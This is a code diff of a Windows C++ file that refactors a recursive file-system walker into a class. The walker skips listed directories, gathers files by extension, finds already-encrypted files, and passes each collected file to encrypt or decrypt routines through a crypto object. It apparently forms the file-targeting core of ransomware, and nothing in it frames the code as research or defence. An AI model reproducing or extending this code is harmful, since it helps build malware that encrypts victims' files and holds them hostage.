@@ -1,33 +1,20 @@
 
 #include "stdafx.h"
+#include "fssearch.h"
 
-//extern std::vector<LPWSTR> filesDB;
-void iterateFilesDB(BOOL action) {
-	//DWORD junk;
-	for (unsigned long int i = 0; i < filesDB.size(); i++) {
-		if (action == TRUE) {
-			startProcedureOnFile(filesDB.at(i));
-		}
-		if (action == FALSE) {
-			decryptProcedure(filesDB.at(i));
-		}
-		
-		//WriteFile(statFileHandle, filesDB.at(i).c_str(), filesDB.at(i).size() * sizeof(wchar_t), &junk, NULL);
-		//WriteFile(statFileHandle, L"\n", sizeof(L"\n"), &junk, NULL);
-	}
-}
 
-void writeCurPath() {
+
+void filesystem::writeCurPath() {
 	GetCurrentDirectory(MAX_PATH, curPath);
 }
-void writeFileDB() {
-	writeCurPath();
+void filesystem::writeFileDB() {
+	filesystem::writeCurPath();
 	std::wstring element(curPath);
 	element += std::wstring(L"\\");
 	element += std::wstring(curItem.cFileName);
 	filesDB.push_back(element);
 }
-bool checkDir(const wchar_t *dirName) //true means the dir is in ignored list, false - the opposite
+bool filesystem::isIgnoredDir(const wchar_t *dirName)
 {
 
 	for(int count=0;count<(sizeof(ignoreDirs)/sizeof(ignoreDirs[0]));count++)
@@ -39,7 +26,7 @@ bool checkDir(const wchar_t *dirName) //true means the dir is in ignored list, f
 	}
 	return false;
 }
-bool checkEncFile(const wchar_t *fileName) {
+bool filesystem::checkEncFile(const wchar_t *fileName) {
 	std::wstring ext(fileName);
 	unsigned int res=0;
 	res =ext.find_last_of('.');
@@ -53,7 +40,7 @@ bool checkEncFile(const wchar_t *fileName) {
 	}
 	return false;
 }
-bool checkFile(const wchar_t *fileName)
+bool filesystem::checkFile(const wchar_t *fileName)
 {
 	std::wstring ext(fileName);
 	unsigned int res = 0;
@@ -70,67 +57,39 @@ bool checkFile(const wchar_t *fileName)
 	}
 	return false;
 }
-int rLibWalking() {
-	namespace fs = std::experimental::filesystem;
 
 
-	std::string path = "C:/users/delta";
-	for (auto & p : fs::recursive_directory_iterator(path))
-	{
-		if (fs::is_directory(p))
-		{
-			std::cout << "<DIR> ";
-		}
-		std::cout << p << std::endl;
-	}
-	return 0;
-}
-
-int rWalking(const wchar_t *dirName, const bool ifBase) {
+void filesystem::rWalking(const wchar_t *dirName, const bool ifBase) {
 	if(_wchdir(dirName)!=0)
 	{
-		return false;
+		return;
 	}
 	auto HFile = new HANDLE;
-	//writeCurPath();
-	//std::wcout << curPath  << std::endl;
-	
-	
 	*HFile = FindFirstFile(L"*", &curItem);
-	/*if(*HFile==INVALID_HANDLE_VALUE) ///FIX THIS
-	{
-		delete HFile;
-		return false; 
-	}*/
 	if(1) {
 		while(FindNextFile(*HFile, &curItem) != 0)
 		{
-
 			if (curItem.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
 			{
-
-				if (checkDir(curItem.cFileName)==false) {
-					//_tprintf(TEXT("  %s   <DIR>\n"), curItem.cFileName);
-					rWalking(curItem.cFileName, false);
+				if (!isIgnoredDir((curItem.cFileName))) {
+					filesystem::rWalking(curItem.cFileName, false);
 				}
 			}
 			else
 			{
-				if (checkFile(curItem.cFileName) == true) {
+				if (checkFile(curItem.cFileName)) {
 					writeFileDB();
 				}
-				
 			}
 		};
 		if (!ifBase) {
 			_wchdir(L"..");
 		}
-		//CloseHandle(*HFile);
 		delete HFile; // never forget
-		return true;
+		return;
 	}
 }
-void searchForEncryptedFiles(const wchar_t *dirName, const bool ifBase) {
+void filesystem::searchForEncryptedFiles(const wchar_t *dirName, const bool ifBase) {
 	if (_wchdir(dirName) != 0)
 	{
 		return;
@@ -144,7 +103,7 @@ void searchForEncryptedFiles(const wchar_t *dirName, const bool ifBase) {
 			if (curItem.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
 			{
 
-				if (!checkDir(curItem.cFileName)) {
+				if (!isIgnoredDir(curItem.cFileName)) {
 					//_tprintf(TEXT("  %s   <DIR>\n"), curItem.cFileName);
 					searchForEncryptedFiles(curItem.cFileName, false);
 				}
@@ -163,5 +122,27 @@ void searchForEncryptedFiles(const wchar_t *dirName, const bool ifBase) {
 		//CloseHandle(*HFile);
 		delete HFile; // never forget
 		return;
+	}
+}
+
+filesystem::filesystem()
+{
+}
+
+filesystem::~filesystem()
+{
+}
+
+void filesystem::iterateFilesDB(BOOL action)
+{
+	file fileObj;
+	for (unsigned long int i = 0; i < filesDB.size(); i++) {
+		if (action == TRUE) {
+			fileObj.startProcedureOnFile(filesDB.at(i), &CryptObj);
+		}
+		if (action == FALSE) {
+			fileObj.decryptProcedure(filesDB.at(i), &CryptObj);
+		}
+
 	}
 }
